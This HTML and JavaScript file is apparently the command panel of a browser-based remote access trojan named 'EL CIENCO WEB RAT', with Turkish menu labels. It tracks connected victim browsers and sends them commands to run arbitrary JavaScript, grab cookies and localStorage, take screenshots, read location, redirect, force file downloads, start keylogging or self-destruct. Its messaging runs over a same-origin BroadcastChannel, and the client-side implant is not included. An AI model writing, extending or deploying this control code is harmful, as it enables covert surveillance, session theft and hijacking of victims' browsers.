<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>EL CIENCO RAT CONTROL PANEL</title>
<style>
body {
    background: #0a0a0a;
    color: #0f0;
    font-family: monospace;
    margin: 0;
    padding: 20px;
}
.container {
    max-width: 1400px;
    margin: 0 auto;
}
.header {
    border-bottom: 1px solid #0f0;
    padding-bottom: 10px;
    margin-bottom: 20px;
}
h1 {
    color: #f00;
    margin: 0;
}
.status {
    color: #0f0;
    font-size: 12px;
}
.command-panel {
    background: #1a1a1a;
    border: 1px solid #0f0;
    padding: 15px;
    margin-bottom: 20px;
}
textarea {
    width: 100%;
    height: 100px;
    background: #2a2a2a;
    color: #0f0;
    border: 1px solid #0f0;
    font-family: monospace;
    padding: 10px;
}
select, input, button {
    background: #2a2a2a;
    color: #0f0;
    border: 1px solid #0f0;
    padding: 8px;
    margin: 5px;
    font-family: monospace;
    cursor: pointer;
}
button:hover {
    background: #0f0;
    color: #000;
}
.clients {
    background: #1a1a1a;
    border: 1px solid #0f0;
    padding: 15px;
    margin-bottom: 20px;
    max-height: 300px;
    overflow-y: auto;
}
.client-item {
    border-bottom: 1px solid #333;
    padding: 10px;
    cursor: pointer;
}
.client-item:hover {
    background: #2a2a2a;
}
.client-item.selected {
    background: #0f0;
    color: #000;
}
.output {
    background: #1a1a1a;
    border: 1px solid #0f0;
    padding: 15px;
    height: 300px;
    overflow-y: auto;
    font-size: 12px;
}
.log-line {
    border-bottom: 1px solid #333;
    padding: 5px;
    font-family: monospace;
}
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>EL CIENCO WEB RAT - CONTROL PANEL</h1>
        <div class="status">Status: ACTIVE | Listening for connections</div>
    </div>
    
    <div class="command-panel">
        <h3>COMMAND EXECUTION</h3>
        <select id="clientSelect">
            <option value="all">ALL CLIENTS</option>
        </select>
        <select id="commandType">
            <option value="js">JavaScript Kodu</option>
            <option value="screenshot">Ekran Görüntüsü Al</option>
            <option value="getCookies">Çerezleri Al</option>
            <option value="getLocalStorage">LocalStorage Al</option>
            <option value="getLocation">Konum Al</option>
            <option value="getUserAgent">Tarayıcı Bilgisi Al</option>
            <option value="redirect">Yönlendir</option>
            <option value="alert">Alert Göster</option>
            <option value="download">Dosya İndirt</option>
            <option value="keylogStart">Keylogging Başlat</option>
            <option value="keylogStop">Keylogging Durdur</option>
            <option value="selfDestruct">Kendini Yok Et</option>
        </select>
        <input type="text" id="commandParam" placeholder="Parametre (opsiyonel)" style="width: 300px;">
        <button onclick="sendCommand()">GÖNDER</button>
        <button onclick="refreshClients()">REFRESH</button>
    </div>
    
    <div class="clients">
        <h3>CONNECTED CLIENTS</h3>
        <div id="clientList">No clients connected</div>
    </div>
    
    <div class="output">
        <h3>OUTPUT</h3>
        <div id="output"></div>
    </div>
</div>

<script>
// RAT Kontrol Sunucusu
var clients = {};
var selectedClient = "all";
var serverId = "rat_" + Math.random().toString(36).substr(2, 8);

function log(message, type) {
    var output = document.getElementById("output");
    var div = document.createElement("div");
    div.className = "log-line";
    div.style.color = type === "error" ? "#f00" : (type === "success" ? "#0f0" : "#0ff");
    div.innerHTML = "[" + new Date().toLocaleTimeString() + "] " + message;
    output.appendChild(div);
    output.scrollTop = output.scrollHeight;
}

function refreshClients() {
    var select = document.getElementById("clientSelect");
    select.innerHTML = '<option value="all">ALL CLIENTS</option>';
    
    for(var id in clients) {
        var option = document.createElement("option");
        option.value = id;
        option.text = id + " | " + clients[id].ua.substring(0, 50);
        select.appendChild(option);
    }
    
    var listDiv = document.getElementById("clientList");
    if(Object.keys(clients).length === 0) {
        listDiv.innerHTML = "No clients connected";
    } else {
        listDiv.innerHTML = "";
        for(var id in clients) {
            var div = document.createElement("div");
            div.className = "client-item";
            div.innerHTML = "<b>" + id + "</b><br>" + clients[id].ua + "<br>IP: " + clients[id].ip;
            div.onclick = (function(cid) {
                return function() {
                    selectedClient = cid;
                    log("Selected client: " + cid, "success");
                };
            })(id);
            listDiv.appendChild(div);
        }
    }
}

function sendCommand() {
    var clientId = document.getElementById("clientSelect").value;
    var cmdType = document.getElementById("commandType").value;
    var cmdParam = document.getElementById("commandParam").value;
    
    var command = {
        type: cmdType,
        param: cmdParam,
        sender: serverId
    };
    
    // Komutu hedef client'a gönder
    if(clientId === "all") {
        for(var id in clients) {
            sendToClient(id, command);
        }
        log("Command sent to ALL clients: " + cmdType, "success");
    } else {
        sendToClient(clientId, command);
        log("Command sent to " + clientId + ": " + cmdType, "success");
    }
}

function sendToClient(clientId, command) {
    var client = clients[clientId];
    if(client && client.channel) {
        client.channel.postMessage(command);
    }
}

// BroadcastChannel ile iletişim
var channel = new BroadcastChannel("elcienco_rat");

channel.onmessage = function(e) {
    var data = e.data;
    
    if(data.type === "register") {
        if(!clients[data.clientId]) {
            clients[data.clientId] = {
                id: data.clientId,
                ua: data.userAgent,
                ip: data.ip,
                channel: null,
                lastSeen: Date.now()
            };
            log("New client connected: " + data.clientId, "success");
            refreshClients();
        }
    }
    
    else if(data.type === "response") {
        log("Response from " + data.clientId + ":\n" + JSON.stringify(data.result, null, 2), "info");
    }
    
    else if(data.type === "heartbeat") {
        if(clients[data.clientId]) {
            clients[data.clientId].lastSeen = Date.now();
        }
    }
};

// Periyodik temizlik
setInterval(function() {
    var now = Date.now();
    for(var id in clients) {
        if(now - clients[id].lastSeen > 60000) {
            delete clients[id];
            log("Client disconnected: " + id, "error");
            refreshClients();
        }
    }
}, 30000);

log("Control panel ready. Server ID: " + serverId, "success");
</script>
</body>
</html>
